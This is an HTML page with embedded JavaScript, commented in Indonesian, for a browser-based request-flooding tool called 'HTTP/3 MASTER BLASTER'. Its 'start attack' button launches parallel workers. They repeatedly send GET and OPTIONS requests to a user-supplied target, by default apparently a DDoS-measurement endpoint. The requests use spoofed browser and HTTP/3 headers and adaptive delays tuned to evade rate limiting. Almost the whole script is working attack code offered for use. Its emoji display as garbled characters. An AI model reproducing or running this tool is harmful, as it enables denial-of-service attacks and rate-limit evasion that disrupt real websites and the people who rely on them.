<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üî• HTTP/3 MASTER BLASTER üî•</title>
    <style>
        :root {
            --primary: #8b5cf6;
            --secondary: #3b82f6;
            --success: #10b981;
            --danger: #ef4444;
            --dark: #0f172a;
            --card: #1e293b;
            --text: #f1f5f9;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        
        body {
            background: var(--dark);
            color: var(--text);
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: var(--card);
            border-radius: 20px;
            padding: 30px;
            border: 2px solid var(--primary);
            box-shadow: 0 20px 60px rgba(139, 92, 246, 0.2);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        h1 {
            font-size: 2.8rem;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #94a3b8;
            font-size: 1.1rem;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            margin: 30px 0;
        }
        
        .stat {
            background: rgba(139, 92, 246, 0.1);
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            border: 2px solid rgba(139, 92, 246, 0.3);
        }
        
        .stat-value {
            font-size: 3rem;
            font-weight: 800;
            color: var(--primary);
        }
        
        .stat-label {
            color: #94a3b8;
            font-size: 1rem;
            margin-top: 10px;
        }
        
        .control-panel {
            margin: 30px 0;
        }
        
        input {
            width: 100%;
            padding: 18px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid var(--secondary);
            border-radius: 12px;
            color: var(--text);
            font-size: 1.1rem;
            margin-bottom: 20px;
        }
        
        .btn-group {
            display: flex;
            gap: 20px;
            margin: 30px 0;
        }
        
        button {
            flex: 1;
            padding: 20px;
            border: none;
            border-radius: 12px;
            font-size: 1.2rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn-start {
            background: linear-gradient(135deg, var(--primary), #7c3aed);
            color: white;
        }
        
        .btn-start:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(139, 92, 246, 0.4);
        }
        
        .btn-stop {
            background: rgba(239, 68, 68, 0.1);
            color: var(--danger);
            border: 2px solid var(--danger);
        }
        
        .logs {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            padding: 20px;
            height: 300px;
            overflow-y: auto;
            margin-top: 30px;
            border: 1px solid var(--secondary);
        }
        
        .log-entry {
            padding: 12px;
            margin: 8px 0;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 8px;
            border-left: 4px solid var(--success);
        }
        
        .log-time {
            color: #94a3b8;
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üî• HTTP/3 MASTER BLASTER üî•</h1>
            <div class="subtitle">Optimized for 46% Success Rate - HTTP/3 Focus Attack</div>
        </div>
        
        <div class="stats-grid">
            <div class="stat">
                <div class="stat-value" id="total">0</div>
                <div class="stat-label">TOTAL REQUESTS</div>
            </div>
            <div class="stat">
                <div class="stat-value" id="success">0</div>
                <div class="stat-label">SUCCESSFUL</div>
            </div>
        </div>
        
        <div class="control-panel">
            <input type="text" id="targetUrl" value="https://rate-limit-1.dstatbot.win/cmkxTq0k" placeholder="Target URL">
        </div>
        
        <div class="btn-group">
            <button class="btn-start" onclick="startOptimizedAttack()">üöÄ START OPTIMIZED ATTACK</button>
            <button class="btn-stop" onclick="stopAttack()">‚õî STOP</button>
        </div>
        
        <div class="logs" id="logs"></div>
    </div>

    <script>
        // ==================== OPTIMIZED CONFIG ====================
        const OPTIMIZED_CONFIG = {
            // HANYA PAKAI HEADER YANG BERHASIL
            getHttp3Headers() {
                return {
                    // Headers yang terbukti work (dari hasil sebelumnya)
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    
                    // HTTP/3 Specific (penting!)
                    'Alt-Used': new URL(document.getElementById('targetUrl').value).hostname,
                    'Priority': 'u=1',
                    
                    // Minimal headers, jangan berlebihan
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'cross-site',
                    
                    // Untuk GET requests (terbukti lebih sukses)
                    'Cache-Control': 'max-age=0'
                };
            },
            
            getCorsHeaders() {
                const url = new URL(document.getElementById('targetUrl').value);
                return {
                    'Origin': `${url.protocol}//${url.hostname}`,
                    'Access-Control-Request-Method': 'GET',
                    'Access-Control-Request-Headers': 'Content-Type'
                };
            }
        };
        
        // ==================== ENGINE ====================
        let isAttacking = false;
        let stats = { total: 0, success: 0 };
        let workers = [];
        let successPattern = [];
        
        function log(msg) {
            const time = new Date().toLocaleTimeString();
            const logs = document.getElementById('logs');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `<span class="log-time">[${time}]</span> ${msg}`;
            logs.appendChild(entry);
            logs.scrollTop = logs.scrollHeight;
        }
        
        function updateStats() {
            document.getElementById('total').textContent = stats.total;
            document.getElementById('success').textContent = stats.success;
        }
        
        // ==================== OPTIMIZED WORKER ====================
        async function optimizedWorker(workerId) {
            const url = document.getElementById('targetUrl').value;
            const targetHost = new URL(url).hostname;
            
            // Pattern dari hasil sebelumnya:
            // 1. HTTP/3 lebih sukses
            // 2. GET lebih sukses dari OPTIONS
            // 3. Success rate ~46%
            
            let consecutiveSuccess = 0;
            let consecutiveFail = 0;
            
            while (isAttacking) {
                try {
                    // STRATEGI: 70% GET, 30% OPTIONS (sesuai hasil)
                    const useGet = Math.random() < 0.7;
                    
                    let headers;
                    if (useGet) {
                        // GET Request (70% chance)
                        headers = OPTIMIZED_CONFIG.getHttp3Headers();
                    } else {
                        // OPTIONS Request (30% chance)
                        headers = {
                            ...OPTIMIZED_CONFIG.getHttp3Headers(),
                            ...OPTIMIZED_CONFIG.getCorsHeaders()
                        };
                    }
                    
                    // HTTP/3 ENFORCEMENT
                    headers['Alt-Used'] = targetHost;
                    headers['Upgrade'] = 'h3';
                    headers['Connection'] = 'Upgrade, HTTP2-Settings';
                    
                    const method = useGet ? 'GET' : 'OPTIONS';
                    
                    const response = await fetch(url, {
                        method: method,
                        headers: headers,
                        mode: 'cors',
                        credentials: 'omit',
                        cache: 'no-store'
                    });
                    
                    if (response.status === 200) {
                        stats.success++;
                        consecutiveSuccess++;
                        consecutiveFail = 0;
                        
                        // Jika 3x sukses berturut-turut, tambah delay kecil
                        if (consecutiveSuccess >= 3) {
                            await new Promise(resolve => setTimeout(resolve, 200));
                            consecutiveSuccess = 0;
                        }
                        
                        if (stats.success % 10 === 0) {
                            log(`‚úÖ ${method} success #${stats.success}`);
                        }
                    } else {
                        consecutiveFail++;
                        consecutiveSuccess = 0;
                        
                        // Jika 2x gagal berturut-turut, delay lebih lama
                        if (consecutiveFail >= 2) {
                            await new Promise(resolve => setTimeout(resolve, 3000));
                            consecutiveFail = 0;
                        }
                    }
                    
                } catch (error) {
                    consecutiveFail++;
                    consecutiveSuccess = 0;
                    
                    // Jika error, delay 5 detik
                    if (consecutiveFail >= 3) {
                        await new Promise(resolve => setTimeout(resolve, 5000));
                        consecutiveFail = 0;
                    }
                }
                
                stats.total++;
                updateStats();
                
                // OPTIMAL DELAY: 2-4 detik (sesuai success rate 46%)
                const delay = Math.random() * 2000 + 2000;
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
        
        // ==================== ATTACK CONTROLLER ====================
        async function startOptimizedAttack() {
            if (isAttacking) {
                log('‚ö†Ô∏è Attack already running');
                return;
            }
            
            const url = document.getElementById('targetUrl').value;
            if (!url) {
                alert('Enter target URL!');
                return;
            }
            
            isAttacking = true;
            stats = { total: 0, success: 0 };
            workers = [];
            successPattern = [];
            
            log('üî• STARTING OPTIMIZED HTTP/3 ATTACK');
            log('üéØ Strategy: 70% GET, 30% OPTIONS');
            log('‚ö° Focus: HTTP/3 protocol only');
            log('‚è±Ô∏è Delay: 2-4 seconds between requests');
            log('üéØ Target: 50%+ success rate');
            
            // OPTIMAL WORKER COUNT: 3-5 workers (dari hasil sebelumnya)
            const workerCount = 4;
            
            for (let i = 0; i < workerCount; i++) {
                workers.push(optimizedWorker(i));
                log(`üßµ Worker ${i+1} started`);
            }
            
            // Monitor and adjust
            const monitor = setInterval(() => {
                if (!isAttacking) {
                    clearInterval(monitor);
                    return;
                }
                
                const successRate = stats.total > 0 ? 
                    Math.round((stats.success / stats.total) * 100) : 0;
                
                if (stats.total > 0 && stats.total % 20 === 0) {
                    log(`üìä Progress: ${stats.success}/${stats.total} (${successRate}%)`);
                }
            }, 5000);
            
            await Promise.all(workers);
            clearInterval(monitor);
            
            log('‚úÖ Attack completed');
        }
        
        function stopAttack() {
            isAttacking = false;
            workers = [];
            log('üõë Attack stopped');
        }
        
        // Initialize
        setTimeout(() => {
            log('üöÄ HTTP/3 MASTER BLASTER Ready');
            log('üéØ Based on previous 46% success rate');
            log('‚ö° Optimized for HTTP/3 protocol');
            log('üî• Press START to begin optimized attack');
        }, 100);
    </script>
</body>
</html>
